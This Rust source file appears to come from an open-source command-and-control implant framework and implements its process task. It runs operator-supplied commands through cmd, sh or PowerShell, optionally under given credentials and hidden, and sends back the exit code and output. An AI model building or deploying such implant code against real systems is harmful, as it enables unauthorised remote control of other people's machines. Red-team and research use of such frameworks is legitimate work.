// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]

use core::str::from_utf8_unchecked;
use core::time::Duration;

use crate::c2::event::{Return, Task};
use crate::c2::mux::Mux;
use crate::c2::task::{OsCommand, OsFd};
use crate::c2::CoreResult;
use crate::com::Packet;
use crate::data::str::Fiber;
use crate::data::{read_fiber_vec, Readable, Reader, Writer};
use crate::device::{self, Shell};
use crate::ignore_error;
use crate::io::{self, ErrorKind, Read, Write};
use crate::prelude::*;
use crate::process::{Child, Command, Filter, Stdio};

pub struct Process {
    pub filter:   Filter,
    pub dir:      Fiber,
    pub user:     Fiber,
    pub domain:   Fiber,
    pub password: Fiber,
    pub env:      Vec<Fiber>,
    pub args:     Vec<Fiber>,
    pub stdin:    Vec<u8>,
    pub timeout:  Duration,
    pub flags:    u32,
    pub wait:     bool,
    pub hide:     bool,
}

impl Process {
    fn into(mut self, s: &Shell) -> io::Result<(Command, Duration, bool, Vec<u8>)> {
        let e = some_or_return!(self.args.first(), Err(ErrorKind::InvalidFilename.into()));
        let (mut c, s) = {
            let b = e.as_bytes();
            match e.len() {
                7 if b[0] == b'@' && b[6] == b'@' && b[1] == b'S' && b[5] == b'L' => (Command::new(&s.sh), true),
                7 if b[0] == b'@' && b[6] == b'@' && b[1] == b'P' && b[5] == b'L' => {
                    // NOTE(dij): We don't add any extra arg value to it as it's required to be
                    //            supplied by the host??.
                    //
                    // https://github.com/iDigitalFlame/ThunderStorm/blob/1a56add08b341a811c295bd62b8719832b0495b4/cirrus/values.go#L499
                    //
                    // BUG(dij): Should we change this behavior? I get it if we need
                    //           to do stdin scripts, but we already account for
                    //           that with cmd.exe.
                    (
                        Command::new(s.pwsh.as_ref().ok_or_else(|| io::Error::from(ErrorKind::NotFound))?),
                        false,
                    )
                },
                _ => (Command::new(e), false),
            }
        };
        if self.args.len() > 1 {
            if s {
                // If we have a shell, join all the args as a single arg.
                c.arg(unsafe { from_utf8_unchecked(&device::SHELL_ARGS) });
                let mut f = Fiber::new();
                for (i, v) in self.args[1..].iter().enumerate() {
                    if i > 0 {
                        f.push(' ');
                    }
                    f.push_str(v);
                }
                c.arg(f);
            } else {
                c.args(&self.args[1..]);
            }
        }
        if self.env.len() > 0 {
            c.envs(
                self.env
                    .iter()
                    .map(|v| v.split_once('=').unwrap_or_else(|| (&v, &v[0..0]))),
            );
        }
        c.add_compat();
        c.add_extra(&mut self);
        if self.dir.len() > 0 {
            c.current_dir(self.dir);
        }
        if self.wait {
            c.stdout(Stdio::piped()).stderr(Stdio::piped());
        }
        Ok((c, self.timeout, self.wait, self.stdin))
    }
}

impl Default for Process {
    #[inline]
    fn default() -> Process {
        Process {
            dir:      Fiber::new(),
            env:      Vec::new(),
            user:     Fiber::new(),
            args:     Vec::new(),
            wait:     false,
            hide:     false,
            flags:    0u32,
            stdin:    Vec::new(),
            domain:   Fiber::new(),
            filter:   Filter::empty(),
            timeout:  Duration::ZERO,
            password: Fiber::new(),
        }
    }
}
impl Readable for Process {
    fn read_stream(&mut self, r: &mut impl Reader) -> io::Result<()> {
        read_fiber_vec(r, &mut self.args)?;
        r.read_into_fiber(&mut self.dir)?;
        read_fiber_vec(r, &mut self.env)?;
        r.read_into_bool(&mut self.wait)?;
        r.read_into_u32(&mut self.flags)?;
        r.read_into_duration(&mut self.timeout)?;
        r.read_into_bool(&mut self.hide)?;
        r.read_into_fiber(&mut self.user)?;
        r.read_into_fiber(&mut self.domain)?;
        r.read_into_fiber(&mut self.password)?;
        self.filter.read_stream(r)?;
        r.read_into_vec(&mut self.stdin)
    }
}

pub fn task_proc(mux: &mut Mux, mut r: Packet) -> CoreResult<Option<Packet>> {
    let mut p = Process::default();
    p.read_stream(&mut r)?;
    let (mut c, t, w, s) = p.into(&mux.shell)?;
    if w {
        c.stdout(Stdio::piped()).stderr(Stdio::piped());
    }
    if s.len() > 0 {
        c.stdin(Stdio::piped());
    }
    let mut x = c.spawn()?;
    if let Some(mut w) = x.stdin.take() {
        w.write_all(&s)?;
    }
    let f = x.get_fd();
    if !w {
        let mut n = Packet::new();
        ignore_error!(n.write_u64((x.id() as u64) << 32));
        mux.submit(
            f,
            Task::new(r.job, |_ctx, _w| task_proc_no_output(x)).timeout(t),
        );
        return Ok(Some(n));
    }
    mux.submit(
        f,
        Task::new(r.job, |_ctx, w| task_proc_output(x, w)).timeout(t),
    );
    Ok(None)
}

#[inline]
fn task_proc_no_output(mut p: Child) -> io::Result<Return> {
    if p.try_wait().is_err() {
        ignore_error!(p.kill());
    }
    Ok(Return::NoOutput)
}
fn task_proc_output(mut p: Child, w: &mut Packet) -> io::Result<Return> {
    bugtrack!(
        "c2::task::task_proc_output(): Task {}: Process complete callback triggered.",
        w.job
    );
    if let Err(e) = task_proc_output_inner(&mut p, w) {
        ignore_error!(p.kill());
        ignore_error!(p.wait());
        return Err(e);
    }
    Ok(Return::Output)
}
fn task_proc_output_inner(p: &mut Child, w: &mut Packet) -> io::Result<()> {
    let c = match p.try_wait()? {
        None => {
            // BUG(dij): There's a weird bug where this occurs even after the
            //           Process completes? Not sure if it's Linux only, but you
            //           can trigger it by running the following commands:
            //             - run -t 50s sleep 30
            //             - run -t 20s sleep 10
            //             - run -t 50s sleep 10 (Send after this gets accepted).
            //           One of them will fail with the killed (0x1337 / 4919)
            //           exit code. Weird.
            ignore_error!(p.kill());
            0x1337u32
        },
        Some(v) => v.code().unwrap_or(0x1337) as u32,
    };
    let i = p.id() as u32;
    bugtrack!(
        "c2::task::task_proc_output(): Task {}: Process {i} completed with exit code {c}.",
        w.job
    );
    ignore_error!(w.write_u32(i));
    ignore_error!(w.write_u32(c));
    // Read Stdout/Stderr.
    if let Some(mut r) = p.stdout.take() {
        r.read_to_end(w.as_mut_vec())?;
    }
    if let Some(mut r) = p.stderr.take() {
        r.read_to_end(w.as_mut_vec())?;
    }
    // No zombies, clear out.
    ignore_error!(p.wait());
    bugtrack!(
        "c2::task::task_proc_output(): Task {}: Process complete!",
        w.job
    );
    Ok(())
}
